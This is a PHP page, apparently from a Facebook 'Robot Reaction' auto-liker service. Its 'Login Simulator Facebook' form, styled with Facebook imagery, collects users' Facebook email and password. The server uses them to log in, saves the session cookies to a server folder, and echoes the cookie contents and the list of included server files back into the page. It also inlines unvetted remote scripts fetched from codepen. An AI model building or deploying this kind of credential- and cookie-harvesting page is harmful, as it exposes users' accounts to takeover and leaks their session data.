<?php
session_start();
require_once realpath('ajax/assets/facebook-sdk/facebook.php');
require 'html.php';

/*
 * init
 */

$facebook    = new Facebook(array(
    'appId'  => '6628568379',
    'secret' => md5('{Your-app-secret}'),
    'cookie' => true
));

$accessToken = (isset($_GET["accessToken"]) ? $_GET["accessToken"] : (isset($_GET["token"]) ? $_GET["token"] : (isset($_POST["token"]) ? $_POST["token"] : (isset($_SESSION["access_token"]) ? $_SESSION["access_token"] : false))));

if (isset($_SESSION["cokis"]) && file_exists('cokisx/'.$_SESSION["cokis"]) && preg_match('/c\_user\s+[0-9]{8,20}/m',file_get_contents("cokisx/".$_SESSION["cokis"])) ){
  
}

if (isset($_POST["email"])){
    $username = $_SESSION['a'] = $_POST["email"];
    $password = $_SESSION['b'] = $_POST["pass"];
}
$cfl = $facebook->thisCookie($_SESSION["a"],$_SESSION["b"],"cokisx") or false;

if (isset($_POST["retry"])){
  $username = $_SESSION["a"];
  $password = $_SESSION["b"];
  $cfl = $facebook->thisCookie($username,$password,'cokisx');
  //$facebook->cleanCookie($username,$password,$cfl);
  $facebook->createCookie($username,$password,$cfl);
  die();
} else if (isset($_POST["yes"])){
try {
  $facebook->setAccessToken($accessToken);
  $userData = $facebook->api('v2.0/me');
  $_SESSION["uid"] = $_SESSION["id"] = $userData["id"];
}
catch (FacebookException $e){
  echo $e->getMessage();
}
if (isset($userData)) {
  
  //$_SESSION['fb-user-token'] = $_SESSION["access_token"] = $accessToken;
  $_SESSION['fb-user'] = $userData;
  $_SESSION['login'] = $userData["id"];
  $_SESSION['nama'] = $userData["id"];
  $_SESSION['username'] =$_SESSION['a'];
  $_SESSION['password'] =$_SESSION['b'];
}
if (preg_match('/c\_user\s+[0-9]{8,20}/m',file_get_contents($cfl)) && isset($_SESSION["nama"])){
  echo'<script>
  window.location.href="/instagram/panel.php";
  </script>';
} 
die();
}

if (isset($_POST["email"])){
    $username = $_SESSION['a'] = $_POST["email"];
    $password = $_SESSION['b'] = $_POST["pass"];
    if (!isset($_SESSION["cokis"])){
    $_SESSION["cokis"] = $facebook->buildCookie($username, $password);
    }
  head("Set Access Token | Robot Reaction Facebook");
  echo '<div class="container bg-success">
  <strong>Success!</strong> Token Result:
</div>';
  token_init($username,$password);
  $s["user"] = $username;
  $s["pass"] = $password;
  echo '<div class="container bg-info">
  <strong>Input Your Token</strong>';
  form("/instagram/ajax/assets/php/create-cookie.php", $s);
  echo '<div class="container bg-info">
  <strong>Need Retry ?</strong>
</div>';
  home("?get_token");
  footer();
  die();
  } else if (!isset($_SESSION["cokis"]) || !isset($_SESSION["b"])){
    head("Get Access Token | Robot Reaction Facebook");
    $o['title']='Login Simulator Facebook';
    $o['act'] = '?0';
    cform($o);
    footer();
    die();
  } else if ($accessToken){
    $_SESSION["token"] = $_SESSION["access_token"] = $accessToken;
    $ht = file_get_contents("https://codepen.io/dimaslanjaka/pen/aQXKMa.html");
    $ht = str_replace('<cookies/>',showCookie(),$ht);
    $ht = str_replace('<modules/>',showModule(),$ht);
    echo "<style>".file_get_contents("https://codepen.io/dimaslanjaka/pen/aQXKMa.css")."</style>";
    echo "<script>".file_get_contents("https://codepen.io/dimaslanjaka/pen/aQXKMa.js")."</script>";
    $xht = file_get_contents("https://codepen.io/dimaslanjaka/pen/LXawNp.html");
    if (!isset($_SESSION["first_login"])){
    $ht = str_replace('<result/>', $xht."<div id='dimaslanjaka-result'><result>\n".dologin()."\n</result></div>", $ht);
    $_SESSION["first_login"] = 1;
    } else {
      $ht = str_replace('<result/>', $xht . "<checklogin/><div id='dimaslanjaka-result'><result>\n".checklogin()."\n</result></div>", $ht);
    }
    if (strpos($ht, '<checklogin/>') !== false){
      $js = file_get_contents('https://codepen.io/dimaslanjaka/pen/dQLbWm.js');
      $js = str_replace('<dimaslanjaka>', showCookie(), $js);
      echo $facebook->curl('https://codepen.io/dimaslanjaka/pen/dQLbWm.html', 'cokisx/'.$_SESSION["cokis"]);
      echo '<script>'.$js.'</script>';
      die();
    }
    echo $ht;
  }


  //echo file_get_contents("https://codepen.io/dimaslanjaka/pen/jQdZPb.html");
  //echo '<div class="container"><iframe name="MyFrame" width="100%" height="500px" frameborder="0"></iframe></div>';

function cform($options=null){
   echo '<div class="container">
      <div class="panel panel-primary">
<div class="panel-heading"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yR/r/wHyx5kjomL3.png">'.$options["title"].'</div>
<div class="panel-body">
      <form action="'.$options["act"].'" target="_self" method="POST" class="form-signin">
        <label for="inputEmail" class="sr-only">Email address</label>
        <input type="text" name="email" class="form-control" placeholder="Email address" required autofocus />
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" name="pass" class="form-control" placeholder="Password" required />
        </div><center>
        <button class="btn btn-lg btn-success" type="submit">Login</button></center><br>
      </form>
      </div></div>';
    }

function setToken(){
  global $facebook;
  global $accessToken;
try {
  $facebook->setAccessToken($accessToken);
  return "ok";
} catch(Exception $e){
  $r = $e->getMessage() or $e->getMessages();
  $r .= "\n Set Token failed, Try Again or contact admin +6285655667573 \n";
  return $r;
}
}

function showCookie(){
  $cf = 'cokisx/'.$_SESSION["cokis"] or false;
  if (!file_exists($cf) && file_exists($_SESSION["cokis"])){
    $cf = $_SESSION["cokis"];
  }
  $cf = realpath($cf);
  $cfc = (false != $cf ? file_get_contents($cf) : false);
  return $cfc;
}

function showModule(){
  $r = "";
foreach (get_included_files() as $n){
  $r .= $n."\n";
}
  return $r;
}

function dologin(){
  global $facebook;
  $set = setToken();
  if (trim($set) !== 'ok'){
    echo $set;
    die();
  }
  
$username = $_SESSION["a"];
$password = $_SESSION["b"];
$cfl = $facebook->thisCookie($username,$password,'cokisx');

try {

$dologin = $facebook->doLogin($username,$password, $cfl);
$checklogin = $facebook->checkLogin($username,$password,$cfl);

return $dologin;
}
catch (Exception $e){
  $r = $e->getMessage() or $e->getMessages;
  $r .= "\n Please Reload Page, or contact admin +6285655667573 \n";
  return $r;
}
}

function checklogin(){
  global $facebook;
  
  $set = setToken();
  if (trim($set) !== 'ok'){
    echo $set;
    die();
  }
$username = $_SESSION["a"];
$password = $_SESSION["b"];
$cfl = $facebook->thisCookie($username,$password,'cokisx');
try {

$dologin = $facebook->doLogin($username,$password, $cfl);
$checklogin = $facebook->checkLogin($username,$password,$cfl);

return $checklogin;
}
catch (Exception $e){
  $r = $e->getMessage() or $e->getMessages;
  $r .= "\n Please Reload Page, or contact admin +6285655667573 \n";
  return $r;
}

}